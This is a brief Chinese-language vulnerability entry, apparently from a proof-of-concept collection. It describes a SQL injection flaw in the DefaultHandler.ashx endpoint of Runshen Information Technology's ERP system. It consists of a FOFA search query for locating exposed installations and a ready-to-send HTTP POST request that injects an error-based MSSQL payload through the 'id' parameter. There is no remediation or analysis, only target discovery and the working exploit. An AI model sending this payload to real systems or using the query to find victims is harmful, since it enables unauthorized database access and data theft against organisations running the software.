# 润申信息科技ERP系统DefaultHandler.ashx接口存在sql注入漏洞



## fofa

```yaml
body="PDCA/js/_publicCom.js"
```

## poc

```java
POST /ashx/DefaultHandler.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Connection: close
Content-Length: 115
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=GetDetail&status=300&id=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123')),3,32))<0--
```

